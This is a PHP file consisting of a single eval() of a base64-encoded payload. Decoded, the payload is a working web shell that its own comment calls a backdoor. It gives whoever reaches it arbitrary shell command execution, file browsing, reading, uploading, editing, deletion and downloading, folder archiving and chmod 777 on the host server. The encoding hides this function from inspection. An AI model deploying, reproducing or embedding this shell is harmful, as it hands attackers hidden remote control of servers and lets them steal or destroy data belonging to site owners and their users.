<?php

eval("?>".base64_decode("PD9waHAKLy8gQSByb2J1c3QgYmFja2Rvb3Igc2NyaXB0IG1hZGUgYnkgRGFuaWVsIEJlcmxpbmVyIC0gaHR0cDovL3d3dy5xc2Rjb25zdWx0aW5nLmNvbS8gWzMtMTUtMjAxMV0KLy8gVGhpcyBjb2RlIGlzIHB1YmxpYyBkb21haW4gYW5kIG1heSBiZSB1c2VkIGluIHBhcnQgb3IgaW4gZnVsbCBmb3IgYW55IGxlZ2FsIHB1cnBvc2UuIEkgd291bGQgc3RpbGwgYXBwcmVjaWF0ZSBhIG1lbnRpb24gdGhvdWdoIDopLgoKZnVuY3Rpb24gaXNMaW51eCgkcGF0aCkKewogICAgcmV0dXJuIChzdWJzdHIoJHBhdGgsMCwxKT09Ii8iID8gdHJ1ZSA6IGZhbHNlKTsKfQpmdW5jdGlvbiBnZXRTbGFzaERpcigkaXNMaW51eCkKewogICAgcmV0dXJuKCRpc0xpbnV4ID8gJy8nIDogJ1xcJyk7Cn0KLy9TZWUgaWYgd2UgYXJlIG9uIExpbnV4IG9yIFdpbmRvd3MgYmVjdWFzZSB0aGUgcGF0aHMgaGF2ZSB0byBiZSBwcm9jZXNzZWQgZGlmZmVyZW50bHkKJGN3ZD1nZXRjd2QoKTsKJGlzTGludXg9aXNMaW51eCgkY3dkKTsKaWYoISRpc0xpbnV4KQp7CiAgICAkZHJpdmVMZXR0ZXI9c3Vic3RyKCRjd2QsMCwxKTsKfQokc2xhc2g9Z2V0U2xhc2hEaXIoJGlzTGludXgpOwokcGFydHM9ZXhwbG9kZSgkc2xhc2gsJGN3ZCk7CiRyb290RGlyPSgkaXNMaW51eCA/ICRzbGFzaCA6ICgkZHJpdmVMZXR0ZXIgLiAnOicgLiAkc2xhc2gpKTsKCmZ1bmN0aW9uIGNsZWFuUGF0aCgkcGF0aCwkaXNMaW51eCkKewogICAgJHNsYXNoPWdldFNsYXNoRGlyKCRpc0xpbnV4KTsKICAgICRwYXJ0cz1leHBsb2RlKCRzbGFzaCwkcGF0aCk7CiAgICBmb3JlYWNoKCRwYXJ0cyBhcyAka2V5PT4kdmFsKS8vUHJvY2VzcyAuLiBkaXJlY3RvcmllcyBhbmQgYSBzaW5nbGUgLgogICAgewogICAgICAgIGlmKCR2YWw9PSIuLiIpCiAgICAgICAgewogICAgICAgICAgICAkcGFydHNbJGtleV09IiI7CiAgICAgICAgICAgICRsYXN0S2V5PSRrZXktMTsKICAgICAgICAgICAgJHBhcnRzWyRsYXN0S2V5XT0iIjsKICAgICAgICB9CiAgICAgICAgZWxzZWlmKCR2YWw9PSIuIikKICAgICAgICB7CiAgICAgICAgICAgICRwYXJ0c1ska2V5XT0iIjsKICAgICAgICB9CiAgICB9CiAgICByZXNldCgkcGFydHMpOwogICAgJGZpeGVkUGF0aD0oJGlzTGludXggPyAiLyIgOiAiIik7Ly9Tb21lIFBIUCBjb25maWdzIHdvbnQgYXV0b21hdGljYWxseSBjcmVhdGUgYSB2YXJpYWJsZSBvbiAuPSBvciB3aWxsIGF0IGxlYXN0IHdoaW5lIGFib3V0IGl0CiAgICAkZmlyc3RQaWVjZT10cnVlOwogICAgZm9yZWFjaCgkcGFydHMgYXMgJHZhbCkvL0Fzc2VtYmxlIHRoZSBwYXRoIGJhY2sgdG9nZXRoZXIKICAgIHsKICAgICAgICBpZigkdmFsICE9ICIiKQogICAgICAgIHsKICAgICAgICAgICAgJGZpeGVkUGF0aCAuPSAgKCRmaXJzdFBpZWNlID8gJycgOiAkc2xhc2gpIC4gJHZhbDsKICAgICAgICAgICAgJGZpcnN0UGllY2U9ZmFsc2U7CiAgICAgICAgfQogICAgfQogICAgaWYoJGZpeGVkUGF0aD09IiIpLy9JZiB3ZSB0b29rIG91dCB0aGUgZW50aXJlIHBhdGggZ28gdG8gYm90dG9tIGxldmVsIHRvIGF2b2lkIGFuIGVycm9yCiAgICB7CiAgICAgICAgJGZpeGVkUGF0aD0oJGlzTGludXggPyAkc2xhc2ggOiAoJGRyaXZlTGV0dGVyIC4gIjoiIC4gJHNsYXNoKSk7CiAgICB9CiAgICAKICAgIC8vTWFrZSBzdXJlIHRoZXJlIGlzIGFuIGVuZGluZyBzbGFzaAogICAgaWYoc3Vic3RyKCRmaXhlZFBhdGgsLTEpIT0kc2xhc2gpCiAgICAgICAgJGZpeGVkUGF0aCAuPSAkc2xhc2g7CiAgICByZXR1cm4gJGZpeGVkUGF0aDsKfQppZihpc3NldCgkX1JFUVVFU1RbJ2NobSddKSkKewogICAgaWYoISRpc0xpbnV4KQogICAgewogICAgICAgIGVjaG8gIlRoaXMgZmVhdHVyZSBvbmx5IHdvcmtzIG9uIExpbnV4IjsKICAgIH0KICAgIGVsc2UKICAgIHsKICAgICAgICBlY2hvIChAY2htb2QgKCAkX1JFUVVFU1RbJ2NobSddICwgMDc3NyApID8gIlJlYXNzaWduZWQiIDogIkNhbid0IFJlYXNpZ24iKTsKICAgIH0KfQplbHNlaWYoaXNzZXQoJF9SRVFVRVNUWydwaHBpbmZvJ10pKQp7CiAgICBwaHBpbmZvKCk7Cn0KZWxzZWlmKGlzc2V0KCRfUkVRVUVTVFsnZGwnXSkpCnsKICAgIGlmKEBmb3BlbigkX1JFUVVFU1RbJ2RsJ10gLiAgJF9SRVFVRVNUWydmaWxlJ10sJ3InKT09dHJ1ZSkKICAgIHsKICAgICAgICAkX1JFUVVFU1RbJ2RsJ10gLj0gJF9SRVFVRVNUWydmaWxlJ107CiAgICAgICAgaWYoc3Vic3RyKCRfUkVRVUVTVFsnZGwnXSwwLDEpPT0kc2xhc2gpCiAgICAgICAgICAgICRmaWxlQXJyPWV4cGxvZGUoJHNsYXNoLCRfUkVRVUVTVFsnZGwnXSk7CiAgICAgICAgCiAgICAgICAgaGVhZGVyKCdDb250ZW50LWRpc3Bvc2l0aW9uOiBhdHRhY2htZW50OyBmaWxlbmFtZT0nIC4gJF9SRVFVRVNUWydmaWxlJ10pOwogICAgICAgIGhlYWRlcignQ29udGVudC10eXBlOiBhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nKTsKICAgICAgICByZWFkZmlsZSgkX1JFUVVFU1RbJ2RsJ10pOwogICAgfQogICAgZWxzZQogICAgewogICAgICAgIGVjaG8gJF9SRVFVRVNUWydkbCddOwogICAgfQp9CmVsc2VpZihpc3NldCgkX1JFUVVFU1RbImd6Il0pKQp7CiAgICBpZighJGlzTGludXgpCiAgICB7CiAgICAgICAgZWNobyAiVGhpcyBmZWF0dXJlIG9ubHkgd29ya3Mgb24gTGludXgiOwogICAgfQogICAgZWxzZQogICAgewogICAgICAgICRkaXJlY3Rvcnk9JF9SRVFVRVNUWyJneiJdOwogICAgICAgIAogICAgICAgIGlmKHN1YnN0cigkZGlyZWN0b3J5LC0xKT09Ii8iKQogICAgICAgICAgICAkZGlyZWN0b3J5ID0gc3Vic3RyKCRkaXJlY3RvcnksMCwtMSk7IAogICAgICAgICAgICAgICAgCiAgICAgICAgJGRpclBhcnRzPWV4cGxvZGUoJHNsYXNoLCRkaXJlY3RvcnkpOwogICAgICAgICRmbmFtZT0kZGlyUGFydHNbKHNpemVvZigkZGlyUGFydHMpLTEpXTsKICAgICAgICAKICAgICAgICAkYXJjaGl2ZSA9IHRpbWUoKTsKICAgICAgICAKICAgICAgICBleGVjKCAiY2QgJGRpcmVjdG9yeTsgdGFyIGN6ZiAkYXJjaGl2ZSAqIik7CiAgICAgICAgJG91dHB1dD1AZmlsZV9nZXRfY29udGVudHMoJGRpcmVjdG9yeSAuICIvIiAuICRhcmNoaXZlKTsKICAgICAgICAKICAgICAgICBpZighJG91dHB1dCkKICAgICAgICAgICAgaGVhZGVyKCJDb250ZW50LWRpc3Bvc2l0aW9uOiBhdHRhY2htZW50OyBmaWxlbmFtZT1BQ0NFU1NfUFJPQkxFTSIpOwogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgIGhlYWRlcigiQ29udGVudC1kaXNwb3NpdGlvbjogYXR0YWNobWVudDsgZmlsZW5hbWU9JGZuYW1lLnRneiIpOwogICAgICAgICAgICBlY2hvICRvdXRwdXQ7CiAgICAgICAgfQogICAgICAgIAogICAgICAgIGhlYWRlcignQ29udGVudC10eXBlOiBhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nKTsKICAgICAgICBAdW5saW5rKCRkaXJlY3RvcnkgLiAiLyIgLiAkYXJjaGl2ZSk7CiAgICB9Cn0KZWxzZWlmKGlzc2V0KCRfUkVRVUVTVFsnZiddKSkKewogICAgJGZpbGVuYW1lPSRfUkVRVUVTVFsnZiddOwogICAgJGZpbGU9Zm9wZW4oIiRmaWxlbmFtZSIsInJiIik7CiAgICAgICAgaGVhZGVyKCJDb250ZW50LVR5cGU6IHRleHQvcGxhaW4iKTsKICAgIGZwYXNzdGhydSgkZmlsZSk7Cn0KZWxzZWlmKGlzc2V0KCRfUkVRVUVTVFsnZCddKSkKewogICAgJGQ9JF9SRVFVRVNUWydkJ107CiAgICBlY2hvICI8cHJlPiI7CiAgICBpZiAoJGhhbmRsZSA9IG9wZW5kaXIoIiRkIikpIAogICAgewogICAgICAgIGVjaG8gIjxoMj5saXN0aW5nIG9mICI7CiAgICAgICAgJGNvblN0cmluZz0iIjsKICAgICAgICBpZigkaXNMaW51eCkKICAgICAgICAgICAgZWNobyAiPGEgaHJlZj0nP2Q9JHNsYXNoJz4kc2xhc2g8L2E+IjsKICAgICAgICBmb3JlYWNoKGV4cGxvZGUoJHNsYXNoLGNsZWFuUGF0aCgkZCwkaXNMaW51eCkpIGFzICR2YWwpCiAgICAgICAgewogICAgICAgICAgICAkY29uU3RyaW5nIC49ICR2YWwgLiAkc2xhc2g7CiAgICAgICAgICAgIGVjaG8gIjxhIGhyZWY9Jz9kPSRjb25TdHJpbmcnPiIgLiAkdmFsIC4gIjwvYT4iIC4gKCR2YWwgIT0gIiIgPyAkc2xhc2ggOiAnJyk7CiAgICAgICAgfQogICAgICAgIGVjaG8gIiAoPGEgdGFyZ2V0PSdfYmxhbmsnIGhyZWY9Jz91cGxvYWRGb3JtPTEmZGlyPSIgLiB1cmxlbmNvZGUoY2xlYW5QYXRoKCRkLCRpc0xpbnV4KSkgLiAiJz51cGxvYWQgZmlsZTwvYT4pICg8YSBocmVmPSc/ZD0iIC4gdXJsZW5jb2RlKGNsZWFuUGF0aCgkZCwkaXNMaW51eCkpIC4gIiZobGRiPTEnPkRCIGludGVyYWN0aW9uIGZpbGVzIGluIHJlZDwvYT4pPC9oMj4gKDxhIHRhcmdldD0nX2JsYW5rJyBocmVmPSc/Z3o9IiAuIHVybGVuY29kZShjbGVhblBhdGgoJGQsJGlzTGludXgpKSAuICInPmd6aXAgJiBkb3dubG9hZCBmb2xkZXI8L2E+KSAoPGEgdGFyZ2V0PSdfYmxhbmsnIGhyZWY9Jz9jaG09IiAuIHVybGVuY29kZShjbGVhblBhdGgoJGQsJGlzTGludXgpKSAuICInPmNobW9kIGZvbGRlciB0byA3NzcpPC9hPiAodGhlc2UgcmFyZWx5IHdvcmspPGJyIC8+IjsKICAgICAgICB3aGlsZSAoJGRpciA9IHJlYWRkaXIoJGhhbmRsZSkpCiAgICAgICAgeyAKICAgICAgICAgICAgaWYgKGlzX2RpcigiJGQkc2xhc2gkZGlyIikpIAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpZigkZGlyICE9ICIuIiAmJiAkZGlyICE9Ii4uIikKICAgICAgICAgICAgICAgICAgICAkZGlyTGlzdFtdPSRkaXI7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpZihpc3NldCgkX1JFUVVFU1RbImhsZGIiXSkpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJGNvbnRlbnRzPWZpbGVfZ2V0X2NvbnRlbnRzKCIkZCRzbGFzaCRkaXIiKTsKICAgICAgICAgICAgICAgICAgICBpZiAoc3RyaXBvcygkY29udGVudHMsICJteXNxbF8iKSB8fCBzdHJpcG9zKCRjb250ZW50cywgIm15c3FsaV8iKSB8fCBzdHJpcG9zKCRjb250ZW50cywgIlNFTEVDVCAiKSkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICRmaWxlTGlzdFtdPWFycmF5KCdkaXInPT4kZGlyLCdjb2xvcic9PidyZWQnKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGZpbGVMaXN0W109YXJyYXkoJ2Rpcic9PiRkaXIsJ2NvbG9yJz0+J2JsYWNrJyk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRmaWxlTGlzdFtdPWFycmF5KCdkaXInPT4kZGlyLCdjb2xvcic9PidibGFjaycpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIAogICAgICAgIGVjaG8gIjxhIGhyZWY9Jz9kPSRkJHNsYXNoLic+PGZvbnQgY29sb3I9Z3JleT4uXG48L2ZvbnQ+PC9hPiI7CiAgICAgICAgZWNobyAiPGEgaHJlZj0nP2Q9JGQkc2xhc2guLic+PGZvbnQgY29sb3I9Z3JleT4uLlxuPC9mb250PjwvYT4iOwogICAgICAgIAogICAgICAgIC8vU29tZSBjb25maWd1cmF0aW9ucyB0aHJvdyBhIG5vdGljZSBpZiBpc19hcnJheSBpcyB0cmllZCB3aXRoIGEgbm9uLWV4aXN0YW50IHZhcmlhYmxlCiAgICAgICAgaWYoaXNzZXQoJGRpckxpc3QpKQogICAgICAgIGlmKGlzX2FycmF5KCRkaXJMaXN0KSkKICAgICAgICBmb3JlYWNoKCRkaXJMaXN0IGFzICRkaXIpCiAgICAgICAgewogICAgICAgICAgICAgICAgZWNobyAiPGEgaHJlZj0nP2Q9JGQkc2xhc2gkZGlyJz48Zm9udCBjb2xvcj1ncmV5PiRkaXJcbjwvZm9udD48L2E+IjsKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgaWYoaXNzZXQoJGZpbGVMaXN0KSkKICAgICAgICBpZihpc19hcnJheSgkZmlsZUxpc3QpKQogICAgICAgIGZvcmVhY2goJGZpbGVMaXN0IGFzICRkaXIpCiAgICAgICAgewogICAgICAgICAgICBlY2hvICI8YSBocmVmPSc/Zj0kZCIgLiAkc2xhc2ggLiAkZGlyWydkaXInXSAuICInPjxmb250IGNvbG9yPSIgLiAkZGlyWydjb2xvciddIC4gIj4iIC4gJGRpclsnZGlyJ10gLiAiPC9mb250PjwvYT4iIC4gCiAgICAgICAgICAgICAgICAgInw8YSBocmVmPSc/ZGw9IiAuIGNsZWFuUGF0aCgkZCwkaXNMaW51eCkgLiAnJmZpbGU9JyAuJGRpclsiZGlyIl0gLiAiJyB0YXJnZXQ9J19ibGFuayc+RG93bmxvYWQ8L2E+fCIgLiAKICAgICAgICAgICAgICAgICAifDxhIGhyZWY9Jz9lZj0iIC4gY2xlYW5QYXRoKCRkLCRpc0xpbnV4KSAuICcmZmlsZT0nIC4kZGlyWyJkaXIiXSAuICInIHRhcmdldD0nX2JsYW5rJz5FZGl0PC9hPnwiIC4gCiAgICAgICAgICAgICAgICAgInw8YSBocmVmPSc/ZGY9IiAuIGNsZWFuUGF0aCgkZCwkaXNMaW51eCkgLiAnJmZpbGU9JyAuJGRpclsiZGlyIl0gLiAiJyB0YXJnZXQ9J19ibGFuayc+RGVsZXRlPC9hPnwgXG4iOwogICAgICAgIH0KICAgIH0gCiAgICBlbHNlIAogICAgZWNobyAib3BlbmRpcigpIGZhaWxlZCI7CiAgICBjbG9zZWRpcigkaGFuZGxlKTsKfQplbHNlaWYoaXNzZXQoJF9SRVFVRVNUWydjJ10pKQp7CiAgICBpZiggQGluaV9nZXQoJ3NhZmVfbW9kZScpICkKICAgIHsKICAgICAgICBlY2hvICdTYWZlIG1vZGUgaXMgb24sIHRoZSBjb21tYW5kIGlzIGJ5IGRlZmF1bHQgcnVuIHRob3VnaCBlc2NhcGVzaGVsbGNtZCgpIGFuZCBjYW4gb25seSBydW4gcHJvZ3JhbW1zIGluIHNhZmVfbW9kX2V4ZWNfZGlyICgnIC4gQGluaV9nZXQoJ3NhZmVfbW9kZV9leGVjX2RpcicpIC4gJykgPGJyIC8+JzsKICAgIH0KICAgIGVjaG8gIjxiPkNvbW1hbmQ6IDxJPiIgLiAkX1JFUVVFU1RbJ2MnXSAuICI8L0k+PC9iPjxiciAvPjxiciAvPiI7CiAgICB0cmltKGV4ZWMoJF9SRVFVRVNUWydjJ10sJHJldHVybikpOwogICAgZm9yZWFjaCgkcmV0dXJuIGFzICR2YWwpCiAgICB7CiAgICAgICAgZWNobyAnPHByZT4nIC4gaHRtbGVudGl0aWVzKCR2YWwpIC4gJzwvcHJlPic7CiAgICB9Cn0KZWxzZWlmKGlzc2V0KCRfUkVRVUVTVFsndXBsb2FkRm9ybSddKSB8fCBpc3NldCgkX0ZJTEVTWyJmaWxlX25hbWUiXSkpCnsKICAgIGlmKGlzc2V0KCRfRklMRVNbImZpbGVfbmFtZSJdKSkKICAgIHsKICAgICAgICBpZiAoJF9GSUxFU1siZmlsZV9uYW1lIl1bImVycm9yIl0gPiAwKQogICAgICAgIHsKICAgICAgICAgICAgICAgIGVjaG8gIkVycm9yIjsKICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgJHRhcmdldF9wYXRoID0gJF9DT09LSUVbInVwbG9hZERpciJdOwogICAgICAgICAgICBpZihzdWJzdHIoJHRhcmdldF9wYXRoLC0xKSAhPSAiLyIpCiAgICAgICAgICAgICAgICAkdGFyZ2V0X3BhdGggLj0gIi8iOwogICAgICAgICAgICAKICAgICAgICAgICAgJHRhcmdldF9wYXRoID0gJHRhcmdldF9wYXRoIC4gYmFzZW5hbWUoICRfRklMRVNbJ2ZpbGVfbmFtZSddWyduYW1lJ10pOyAKCiAgICAgICAgICAgIGlmKG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWydmaWxlX25hbWUnXVsndG1wX25hbWUnXSwgJHRhcmdldF9wYXRoKSkgewogICAgICAgICAgICAgICAgc2V0Y29va2llKCJ1cGxvYWREaXIiLCIiKTsKICAgICAgICAgICAgICAgIGVjaG8gIlRoZSBmaWxlICIuICBiYXNlbmFtZSggJF9GSUxFU1snZmlsZV9uYW1lJ11bJ25hbWUnXSkuIAogICAgICAgICAgICAgICAgIiBoYXMgYmVlbiB1cGxvYWRlZCI7CiAgICAgICAgICAgIH0gCiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgZWNobyAiRXJyb3IgY29weWluZyBmaWxlLCBsaWtlbHkgYSBwZXJtaXNzaW9uIGVycm9yLiI7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CiAgICBlbHNlCiAgICB7ICAgICAgIAogICAgICAgID8+CiAgICAgICAgPGZvcm0gdGFyZ2V0PSJfYmxhbmsiIGFjdGlvbj0iIiBtZXRob2Q9IkdFVCI+CiAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImNjIiB2YWx1ZT0iMSIgLz4KICAgICAgICAgICAgU3VibWl0IHRoaXMgZm9ybSBiZWZvcmUgc3VibWl0dGluZyBmaWxlICh3aWxsIG9wZW4gaW4gbmV3IHdpbmRvdyk6PGJyIC8+CiAgICAgICAgICAgIFVwbG9hZCBEaXJlY3Rvcnk6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJkaXIiIHZhbHVlPSI8P3BocCBlY2hvICRfUkVRVUVTVFsiZGlyIl0gPz4iPjxiciAvPgogICAgICAgICAgICA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0ic3VibWl0IiAvPgogICAgICAgIDwvZm9ybT4KICAgICAgICA8YnIgLz48YnIgLz4KICAgICAgICAKICAgICAgICA8Zm9ybSBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBhY3Rpb249IiIgbWV0aG9kPSJwb3N0Ij4KICAgICAgICBVcGxvYWQgZmlsZTo8aW5wdXQgbmFtZT0iZmlsZV9uYW1lIiB0eXBlPSJmaWxlIj4gPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IlVwbG9hZCIgLz48L2Zvcm0+CgogICAgICAgIDw/cGhwCiAgICB9Cn0KZWxzZWlmKGlzc2V0KCRfUkVRVUVTVFsnY2MnXSkpCnsKICAgIHNldGNvb2tpZSgidXBsb2FkRGlyIiwkX0dFVFsiZGlyIl0pOwogICAgZWNobyAiWW91IGFyZSBPSyB0byB1cGxvYWQgdGhlIGZpbGUsIGRvbid0IHVwbG9hZCBmaWxlcyB0byBvdGhlciBkaXJlY3RvcmllcyBiZWZvcmUgY29tcGxldGluZyB0aGlzIHVwbG9hZC4iOwp9CmVsc2VpZihpc3NldCgkX1JFUVVFU1RbJ2RmJ10pKQp7CiAgICAkX1JFUVVFU1RbJ2RmJ10gLj0gJHNsYXNoIC4gJF9SRVFVRVNUWydmaWxlJ107CiAgICBpZihAdW5saW5rKCRfUkVRVUVTVFsnZGYnXSkpCiAgICB7CiAgICAgICAgICAgIGVjaG8gIkZpbGUgZGVsZXRlZCI7CiAgICB9CiAgICBlbHNlCiAgICB7CiAgICAgICAgICAgIGVjaG8gIkVycm9yIGRlbGV0aW5nIGZpbGUiOwogICAgfQp9CmVsc2VpZihpc3NldCgkX1JFUVVFU1RbJ2VmJ10pKQp7Cj8+CjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4KICA8IS0tCgogIHZhciBrZXkgPSAiQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODkrLz0iOwoKICBmdW5jdGlvbiBlbmNvZGU2NChpbnBTdHIpIAogIHsKICAgICBpbnBTdHIgPSBlc2NhcGUoaW5wU3RyKTsKICAgICB2YXIgb3V0cHV0ID0gIiI7CiAgICAgdmFyIGNocjEsIGNocjIsIGNocjMgPSAiIjsKICAgICB2YXIgZW5jMSwgZW5jMiwgZW5jMywgZW5jNCA9ICIiOwogICAgIHZhciBpID0gMDsKCiAgICAgZG8gewogICAgICAgIGNocjEgPSBpbnBTdHIuY2hhckNvZGVBdChpKyspOwogICAgICAgIGNocjIgPSBpbnBTdHIuY2hhckNvZGVBdChpKyspOwogICAgICAgIGNocjMgPSBpbnBTdHIuY2hhckNvZGVBdChpKyspOwoKICAgICAgICBlbmMxID0gY2hyMSA+PiAyOwogICAgICAgIGVuYzIgPSAoKGNocjEgJiAzKSA8PCA0KSB8IChjaHIyID4+IDQpOwogICAgICAgIGVuYzMgPSAoKGNocjIgJiAxNSkgPDwgMikgfCAoY2hyMyA+PiA2KTsKICAgICAgICBlbmM0ID0gY2hyMyAmIDYzOwoKICAgICAgICBpZiAoaXNOYU4oY2hyMikpIAogICAgICAgIHsKICAgICAgICAgICBlbmMzID0gZW5jNCA9IDY0OwogICAgICAgIH0gCiAgICAgICAgZWxzZSBpZiAoaXNOYU4oY2hyMykpIAogICAgICAgIHsKICAgICAgICAgICBlbmM0ID0gNjQ7CiAgICAgICAgfQoKICAgICAgICBvdXRwdXQgPSBvdXRwdXQgKwogICAgICAgICAgIGtleS5jaGFyQXQoZW5jMSkgKwogICAgICAgICAgIGtleS5jaGFyQXQoZW5jMikgKwogICAgICAgICAgIGtleS5jaGFyQXQoZW5jMykgKwogICAgICAgICAgIGtleS5jaGFyQXQoZW5jNCk7CiAgICAgICAgY2hyMSA9IGNocjIgPSBjaHIzID0gZW5jMSA9IGVuYzIgPSBlbmMzID0gZW5jNCA9ICIiOwogICAgIH0gd2hpbGUgKGkgPCBpbnBTdHIubGVuZ3RoKTsKCiAgICAgcmV0dXJuIG91dHB1dDsKICB9CgogIC8vLS0+PC9zY3JpcHQ+CgogIDw/cGhwCiAgICAkX1JFUVVFU1RbJ2VmJ10gLj0gJF9SRVFVRVNUWydmaWxlJ107IAogICAgaWYoaXNzZXQoJF9QT1NUWyJuZXdjb250ZW50Il0pKQogICAgewogICAgICAgICRfUE9TVFsibmV3Y29udGVudCJdPXVybGRlY29kZShiYXNlNjRfZGVjb2RlKCRfUE9TVFsibmV3Y29udGVudCJdKSk7CiAgICAgICAgJHN0cmVhbT1AZm9wZW4oJF9SRVFVRVNUWydlZiddLCJ3Iik7CiAgICAgICAgCiAgICAgICAgaWYoJHN0cmVhbSkKICAgICAgICB7CiAgICAgICAgICAgIGZ3cml0ZSgkc3RyZWFtLCRfUE9TVFsibmV3Y29udGVudCJdKTsKICAgICAgICAgICAgZWNobyAiV3JpdGUgc3VjZXNzZnVsIjsKICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgZWNobyAiQ291bGQgbm90IHdyaXRlIHRvIGZpbGUiOwogICAgICAgIH0KICAgICAgICBmY2xvc2UoJHN0cmVhbSk7CiAgICB9CiAgICA/PgogICAgPGZvcm0gYWN0aW9uPSIiIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCI+CiAgICA8dGV4dGFyZWEgd3JhcD0ib2ZmIiByb3dzPSI0MCIgY29scz0iMTMwIiBuYW1lPSJuZXdjb250ZW50Ij48P3BocCBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCRfUkVRVUVTVFsnZWYnXSkgPz48L3RleHRhcmVhPjxiciAvPgogICAgPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkkgYmFzZTY0IGVuY29kZWQgaXQgbXlzZWxmLCBkb250IHJ1biBzY3JpcHQiIC8+PGJyIC8+CiAgICA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iQ2hhbmdlIChyZXF1aXJlcyBqYXZhc2NyaXB0IHRvIHdvcmspIiAgb25jbGljaz0iZG9jdW1lbnQuZi5uZXdjb250ZW50LnZhbHVlPWVuY29kZTY0KGRvY3VtZW50LmYubmV3Y29udGVudC52YWx1ZSk7IiAvPgogICAgPC9mb3JtPgogICAgPD9waHAKfQplbHNlCnsKPz4KPGI+U2VydmVyIEluZm9ybWF0aW9uOjwvYj48YnIgLz4KPGk+Ck9wZXJhdGluZyBTeXN0ZW06IDw/cGhwIGVjaG8gUEhQX09TID8+PGJyIC8+ClBIUCBWZXJzaW9uOiA8P3BocCBlY2hvIFBIUF9WRVJTSU9OID8+PGJyIC8+CjxhIGhyZWY9Ij9waHBpbmZvPXRydWUiPlZpZXcgcGhwaW5mbzwvYT4KPC9pPgo8YnIgLz4KPGJyIC8+CjxiPkRpcmVjdG9yeSBUcmF2ZXJzYWw8L2I+PGJyIC8+CjxhIGhyZWY9Ij9kPTw/cGhwIGVjaG8gZ2V0Y3dkKCkgPz4iPjxiPkdvIHRvIGN1cnJlbnQgd29ya2luZyBkaXJlY3Rvcnk8L2I+PC9hPiA8YnIgLz4KPGEgaHJlZj0iP2Q9PD9waHAgZWNobyAkcm9vdERpciA/PiI+PGI+R28gdG8gcm9vdCBkaXJlY3Rvcnk8L2I+PC9hPiA8YnIgLz4KPGI+R28gdG8gYW55IGRpcmVjdG9yeTo8L2I+IDxmb3JtIGFjdGlvbj0iIiBtZXRob2Q9IkdFVCI+PGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImQiIHZhbHVlPSI8P3BocCBlY2hvICRyb290RGlyID8+IiAvPjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJHbyIgLz48L2Zvcm0+Cgo8cHJlPjxmb3JtIGFjdGlvbj0iIiBNRVRIT0Q9IkdFVCIgPkV4ZWN1dGUgU2hlbGwgQ29tbWFuZCAoc2FmZSBtb2RlIGlzIDw/cGhwIGVjaG8gKEBpbmlfZ2V0KCdzYWZlX21vZGUnKSA/ICdvbicgOiAnb2ZmJykgPz4pOiA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iYyI+PGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkdvIj48L2Zvcm0+IAo8P3BocAp9Ci8vSW50ZW50aW9uYWxseSBsZWZ0IG9wZW4gdG8gYXZvaWQgb3V0cHV0IHRoZSBmaWxlIGRvd25sb2FkIGZ1bmN0aW9uIDEK")); ?>
